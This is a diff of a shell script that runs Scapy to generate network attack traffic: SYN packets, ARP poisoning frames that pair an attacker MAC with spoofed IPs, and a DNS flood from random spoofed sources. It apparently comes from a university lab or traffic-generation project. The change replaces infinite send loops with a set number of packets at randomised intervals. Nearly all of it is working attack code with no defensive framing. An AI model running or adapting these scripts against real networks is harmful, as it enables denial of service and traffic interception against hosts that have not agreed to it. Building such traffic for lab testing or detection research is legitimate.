@@ -23,52 +23,43 @@ DNS_QUERY="www.fit.cvut.cz."
 
 case $ACTION in
 	SYN)
-scapy <<-END
+scapy <<END
 import time
-def spack():
+x=$NUM
+while x>0:
+	x-=1;
+	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
 	#1)generovani paketu pro SYN
 	packetSYN=IP(dst="$SYN_DST_ADDRESS")/TCP(dport=$SYN_DST_PORT, flags='S')
 	ls(packetSYN)
-	send(packetSYN,loop=1) #posilej paket v nekonecne smycce
-x=$NUM
-while x>0:
-	x-=1;
-	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
-	spack();
+	send(packetSYN)
 END
 		;;
 	ARP)
-scapy <<-END
+scapy <<END
 import time
-def spack():
+x=$NUM
+while x>0:
+	x-=1;
+	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
 	#2)ARP poisoning
 	packetARP=Ether(dst="$VICTIM_MAC")/ARP(op="is-at",hwsrc="$ATTACKER_MAC",psrc="$SPOOFED_SENDER_IP",pdst="$SPOOFED_IP")
 	ls(packetARP)
-	sendp(packetARP,loop=1) #posilej paket v nekonecne smycce
-
-x=$NUM
-while x>0:
-	x-=1;
-	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
-	spack();
+	sendp(packetARP)
 END
-
 		;;
 	DNS)
-scapy <<-END
-#1)generovani paketu pro SYN
+scapy <<END
 import time
-def spack():
+x=$NUM
+while x>0:
+	print "sent"
+	x-=1;
+	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
 	#3)DNS flood
 	dnsq=IP(dst="$DNS_FLOOD_VICTIM",src=RandIP())/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname='$DNS_QUERY',qtype='A',qclass='IN'))
 	ls(dnsq)
-	#send(dnsq,loop=1)
-
-x=$NUM
-while x>0:
-	x-=1;
-	time.sleep(-math.log(1.0 - random.random()) / $LAMBDA);
-	spack();
+	send(dnsq)
 END
 
 		;;
